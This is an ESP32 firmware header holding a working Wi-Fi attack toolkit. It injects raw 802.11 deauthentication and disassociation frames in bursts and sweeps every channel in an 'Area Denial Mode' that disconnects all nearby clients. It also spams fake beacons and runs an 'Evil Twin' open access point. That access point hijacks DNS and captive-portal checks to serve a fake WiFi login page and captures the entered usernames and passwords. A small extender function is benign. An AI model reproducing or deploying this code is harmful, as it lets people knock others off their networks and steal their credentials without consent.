#ifndef WIFI_LOGIC_H
#define WIFI_LOGIC_H

#include <WiFi.h>
#include <esp_wifi.h>
#include <DNSServer.h>
#include <WebServer.h>
#include <atomic>

extern "C" {
#include <lwip/ip_addr.h>
}
#include "Config.h"

// Function prototypes
static const char PROGMEM DEFAULT_HTML[] = "<html><head><title>WiFi Authentication</title><meta name='viewport' content='width=device-width,initial-scale=1'><meta http-equiv='cache-control' content='no-cache'><body><h2>WiFi Login</h2><form action='/login' method='POST'>User: <input name='u' style='width:100%'><br><br>Pass: <input type='password' name='p' style='width:100%' required><br><br><input type='submit' value='Login' style='width:100%'></form></body></head></html>";

inline void sendDeauth(const uint8_t* target, const uint8_t* ap, uint16_t reason) {
    wifi_mode_t mode;
    esp_wifi_get_mode(&mode);
    if (mode == WIFI_MODE_NULL) {
        Serial.println(F("[DEAUTH] ERROR: WiFi mode is NULL"));
        return;
    }

    // Use WIFI_IF_AP if available (most stable for raw injection in APSTA mode)
    wifi_interface_t ifx = (mode == WIFI_MODE_AP || mode == WIFI_MODE_APSTA) ? WIFI_IF_AP : WIFI_IF_STA;
    
    static unsigned long lastDebug = 0;
    
    if (millis() - lastDebug > 10000) {
        const char* modeStr = (mode == 0) ? "NULL" : (mode == 1) ? "STA" : (mode == 2) ? "AP" : (mode == 3) ? "APSTA" : "UNKNOWN";
        const char* ifxStr = (ifx == WIFI_IF_STA) ? "STA" : "AP";
        long sent = AtomicUtils::safe_load(pkts_deauth_sent);
        Serial.printf("[DEAUTH] Mode=%s(%d), IFX=%s, Cnt=%ld, Rate=%.0f/sec\n", 
            modeStr, mode, ifxStr, sent, 
            (float)sent / (millis() / 1000.0));
        Serial.printf("  Target: %02X:%02X:%02X:%02X:%02X:%02X\n", 
            ap[0], ap[1], ap[2], ap[3], ap[4], ap[5]);
        lastDebug = millis();
    }
    if (reason == 0) reason = 0x01; // Default to unspecified reason

    // 802.11 Deauth packet structure compliant with IEEE standard
    uint8_t packet[26] = {
        0xC0, 0x00, 0x3A, 0x01, 
        0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00
    };
    memcpy(&packet[4], target, 6);
    memcpy(&packet[10], ap, 6);
    memcpy(&packet[16], ap, 6);

    // Combines burst logic with penetration testing methodology (Reason 0x02)
    // Reason 0x02: PREVIOUS_AUTHENTICATION_NO_LONGER_VALID forces client disconnection.
    // Reason 0x08: DISASSOCIATED_LOW_ACK (highly effective against mobile devices)
    // Reason 0x0A: DISASSOCIATED_DUE_TO_INACTIVITY
    // Bursting deauth (0xC0) and disassoc (0xA0) multiplies success rate.
    uint16_t burstReasons[] = {reason, 0x02, 0x04, 0x06, 0x07, 0x08, 0x0A}; 
    
    for (int j = 0; j < 2; j++) { 
        for (uint16_t r : burstReasons) {
            uint16_t seqCtrl = (deauthSeq << 4);
            memcpy(&packet[22], &seqCtrl, 2);
            packet[24] = r & 0xFF;
            packet[25] = (r >> 8) & 0xFF;

            // Type 0xC0 (Deauthentication)
            packet[0] = 0xC0;
            esp_err_t err = esp_wifi_80211_tx(ifx, packet, 26, false);
            
            // Count successful transmissions or buffer attempts as activity
            if (err == ESP_OK) {
                pkts_deauth_sent++; // Directly increment atomic variable
            } else if (err == ESP_ERR_NO_MEM) {
                vTaskDelay(1); // Yield execution time for WiFi buffer processing
                continue; // Proceed to next packet after short yield
            }
            
            // Type 0xA0 (Disassociation)
            packet[0] = 0xA0;
            if (esp_wifi_80211_tx(ifx, packet, 26, false) == ESP_OK) {
                pkts_deauth_sent++;
            }

            deauthSeq++;
        }
        yield(); // Allow system time to process WiFi stack
    }
}

inline void wifiChannelSweep() {
    static int sweepCh = 1;
    esp_wifi_set_channel(sweepCh, WIFI_SECOND_CHAN_NONE);
    delay(5); // Wait for hardware to stabilize on new channel
    
    // Transmit deauth to broadcast address (FF:FF:FF:FF:FF:FF) on current channel
    uint8_t broadcast[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
    for(int i = 0; i < 3; i++) { // Send 3x broadcast bursts per channel
        sendDeauth(broadcast, broadcast, 0x02);
    }
    
    sweepCh++;
    if (sweepCh > 13) sweepCh = 1;
}

inline void sendBeacon(const char* ssid) {
    // Check if WiFi mode is active
    wifi_mode_t mode;
    esp_wifi_get_mode(&mode);
    if (mode == WIFI_MODE_NULL) return;

    // Validate SSID length (max 32 bytes per IEEE 802.11)
    if (ssid == nullptr || strlen(ssid) == 0) return;
    
    uint8_t packet[128];
    int ssid_len = strlen(ssid);
    if (ssid_len > 32) ssid_len = 32;
    uint8_t template_pkt[] = {
        0x80, 0x00, 0x00, 0x00, 
        0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
        0x01, 0x02, 0x03, 0x04, 0x05, 0x06,
        0x01, 0x02, 0x03, 0x04, 0x05, 0x06,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x64, 0x00, 0x11, 0x00, 0x00
    };
    memcpy(packet, template_pkt, 36);
    for(int i=10; i<16; i++) packet[i] = packet[i+6] = esp_random() % 256;
    packet[10] &= 0xFE;
    packet[36] = 0x00;
    packet[37] = ssid_len;
    memcpy(&packet[38], ssid, ssid_len);
    int pos = 38 + ssid_len;
    uint8_t tail[] = { 0x01, 0x08, 0x82, 0x84, 0x8B, 0x96, 0x24, 0x30, 0x48, 0x6C, 0x03, 0x01, (uint8_t)AtomicUtils::safe_load(targetChannel) };
    memcpy(&packet[pos], tail, 13);

    // Use STA interface if AP mode is not active
    wifi_interface_t ifx = (mode == WIFI_MODE_AP || mode == WIFI_MODE_APSTA) ? WIFI_IF_AP : WIFI_IF_STA;
    esp_wifi_80211_tx(ifx, packet, pos + 13, false);
}

inline void handleLogin() {
    if (server.hasArg("u") || server.hasArg("p")) {
        String rawUser = server.arg("u");
        String rawInput = server.arg("p");
        
        // Sanitize input - remove any HTML/script tags
        rawUser.replace("<", "&lt;");
        rawUser.replace(">", "&gt;");
        rawInput.replace("<", "&lt;");
        rawInput.replace(">", "&gt;");
        rawInput.replace("\"", "&quot;");
        
        xSemaphoreTake(stringMutex, portMAX_DELAY);
        capturedUsername = rawUser.substring(0, 32);
        capturedPassword = rawInput.substring(0, 64);
        xSemaphoreGive(stringMutex);
        
        Serial.printf("[LOGIN] Captured -> User: %s, Pass: %s\n", capturedUsername.c_str(), capturedPassword.c_str());
    }
    server.send(200, "text/html", "<html><body><h1>Update Success</h1></body></html>");
}

inline void startWiFiJammer() {
    Serial.println("[JAMMER] Initializing Silent Mode...");
    
    // 1. Complete WiFi reset
    WiFi.disconnect(true);
    WiFi.softAPdisconnect(true);
    WiFi.mode(WIFI_OFF);
    delay(200);
    
    // 2. Use AP_STA mode for raw injection stability.
    // Configure AP interface manually as hidden to prevent broadcasting default "esp32" SSID.
    WiFi.mode(WIFI_AP_STA); 
    
    wifi_config_t ap_config = {};
    memset(&ap_config, 0, sizeof(ap_config));
    ap_config.ap.ssid_len = 0;        // Empty SSID
    ap_config.ap.ssid_hidden = 1;     // Hidden SSID
    int ch = AtomicUtils::safe_load(targetChannel);
    ap_config.ap.channel = ch;
    ap_config.ap.authmode = WIFI_AUTH_OPEN;
    ap_config.ap.max_connection = 1;
    esp_wifi_set_config(WIFI_IF_AP, &ap_config);
    
    delay(300);

    // 3. Radio Configuration
    esp_wifi_set_promiscuous(false);
    esp_wifi_set_storage(WIFI_STORAGE_RAM);
    esp_wifi_start();
    esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
    delay(100);
    esp_wifi_set_promiscuous(true);
    
    AtomicUtils::safe_store(pkts_deauth_sent, 0L);
    
    Serial.printf("[JAMMER] Attack started on Ch:%d\n", ch);
}

inline void handleCaptivePortal() {
    // Thread-safe atomic increment
    int current = AtomicUtils::safe_load(captivePortalHits);
    AtomicUtils::safe_store(captivePortalHits, current + 1);
    
    String htmlResponse;
    if (webTemplate != "") {
        htmlResponse = webTemplate;
    } else {
        htmlResponse = String(FPSTR(DEFAULT_HTML));
    }
    server.sendHeader("Cache-Control", "no-cache, no-store, must-revalidate");
    server.sendHeader("Pragma", "no-cache");
    server.sendHeader("Expires", "-1");
    server.send(200, "text/html", htmlResponse);
}

inline void startEvilTwin() {
    xSemaphoreTake(stringMutex, portMAX_DELAY);
    if (lockedSSID.length() == 0) lockedSSID = "WiFi_Upgrade"; 
    String ssidCopy = lockedSSID;
    xSemaphoreGive(stringMutex);

    int ch = AtomicUtils::safe_load(targetChannel);
    
    WiFi.mode(WIFI_AP_STA);
    WiFi.disconnect(true);
    delay(200);
    
    esp_wifi_set_storage(WIFI_STORAGE_RAM);
    esp_wifi_start();
    delay(300);  // Wait for WiFi stack initialization
    
    esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
    esp_wifi_set_promiscuous_rx_cb(NULL);
    esp_wifi_set_promiscuous(true);
    delay(100);
    
    WiFi.softAP(ssidCopy.c_str(), "", ch);
    delay(300);
    
    dnsServer.start(53, "*", WiFi.softAPIP());

    // Explicit captive portal detection endpoints for Android, iOS, & Windows
    server.on("/", handleCaptivePortal);
    server.on("/generate_204", handleCaptivePortal);       // Primary Android endpoint
    server.on("/check_network_status", handleCaptivePortal); // Secondary Android endpoint
    server.on("/hotspot-detect.html", handleCaptivePortal); // Apple iOS/macOS endpoint
    server.on("/connecttest.txt", handleCaptivePortal);    // Microsoft/Universal endpoint
    
    server.on("/login", handleLogin);
    server.onNotFound(handleCaptivePortal);
    server.begin();
}

inline void startBeaconSpam() {
    Serial.println("[BEACON] Initializing Raw Injection Mode (No SSID)...");
    WiFi.disconnect(true);
    WiFi.softAPdisconnect(true);
    WiFi.mode(WIFI_OFF);
    delay(200);

    WiFi.mode(WIFI_AP_STA); 
    
    // Silent AP Config for Beacon Spam to avoid collision with raw injection frames
    wifi_config_t ap_config = {};
    memset(&ap_config, 0, sizeof(ap_config));
    ap_config.ap.ssid_len = 0;
    ap_config.ap.ssid_hidden = 1;
    ap_config.ap.channel = AtomicUtils::safe_load(targetChannel);
    esp_wifi_set_config(WIFI_IF_AP, &ap_config);

    delay(300);

    esp_wifi_set_promiscuous(false);
    esp_wifi_set_storage(WIFI_STORAGE_RAM);
    esp_wifi_start();
    esp_wifi_set_channel(AtomicUtils::safe_load(targetChannel), WIFI_SECOND_CHAN_NONE);
    esp_wifi_set_promiscuous(true);
    AtomicUtils::safe_store(beaconStarted, true);
}

inline void startWiFiSweep() {
    Serial.println("[SWEEP] Initializing Area Denial Mode...");
    WiFi.disconnect(true);
    WiFi.softAPdisconnect(true);
    WiFi.mode(WIFI_OFF);
    delay(200);
    
    WiFi.mode(WIFI_AP_STA);
    
    wifi_config_t ap_config = {};
    memset(&ap_config, 0, sizeof(ap_config));
    ap_config.ap.ssid_len = 0;
    ap_config.ap.ssid_hidden = 1;
    ap_config.ap.authmode = WIFI_AUTH_OPEN;
    esp_wifi_set_config(WIFI_IF_AP, &ap_config);
    
    delay(300);
    esp_wifi_set_promiscuous(false);
    esp_wifi_start();
    esp_wifi_set_promiscuous(true);
    
    AtomicUtils::safe_store(pkts_deauth_sent, 0L);

    xSemaphoreTake(stringMutex, portMAX_DELAY);
    lockedSSID = "ALL CHANNELS";
    xSemaphoreGive(stringMutex);
}

inline void stopWiFiAttack() {
    Serial.println("\n[STOP] Stopping WiFi attack...");
    esp_wifi_set_promiscuous(false);
    dnsServer.stop();
    server.stop();
    delay(100);
    WiFi.softAPdisconnect(true);
    WiFi.disconnect(true);
    WiFi.mode(WIFI_OFF); // Turn off completely before switching to STA
    delay(200);
    WiFi.mode(WIFI_STA); 
    AtomicUtils::safe_store(beaconStarted, false);
    Serial.printf("[STOP] Total packets sent: %ld\n", (long)pkts_deauth_sent);
    Serial.printf("[STOP] Average rate: %.0f packets/sec\n", (float)pkts_deauth_sent / (millis() / 1000.0));
}

inline void startWiFiExtender() {
    xSemaphoreTake(stringMutex, portMAX_DELAY);
    if (extenderSSID == "" || extenderSSID.length() == 0) {
        xSemaphoreGive(stringMutex);
        return;
    }
    String s = extenderSSID;
    String p = extenderPassword;
    xSemaphoreGive(stringMutex);

    Serial.println("[EXTENDER] Initializing AP+STA mode...");
    WiFi.disconnect(true); // Clear previous connections
    
    WiFi.mode(WIFI_AP_STA);
    WiFi.begin(s.c_str(), p.c_str());
    
    AtomicUtils::safe_store(extenderActive, true);
    // Create AP with _EXT suffix
    String apSSID = s + "_EXT";
    WiFi.softAP(apSSID.c_str(), p.c_str());

    /* 
       NOTE FOR VERSION 2.0.14: 
       NAT (Internet Sharing) feature is not supported by default.
       To enable lines below, upgrade ESP32 Board package to v3.0.0+
    */
    // ip_napt_init(32, 32);
    // ip_napt_enable_no(0, 1);
    
    Serial.println("[EXTENDER] Connecting to: " + s);
    Serial.println("[EXTENDER] AP Broadcast: " + apSSID);
}

inline void stopWiFiExtender() {
    Serial.println("[EXTENDER] Stopping...");
    AtomicUtils::safe_store(extenderActive, false);
    WiFi.disconnect(true);
    WiFi.softAPdisconnect(true);
    WiFi.mode(WIFI_OFF);
    delay(200);
    WiFi.mode(WIFI_STA);
}

#endif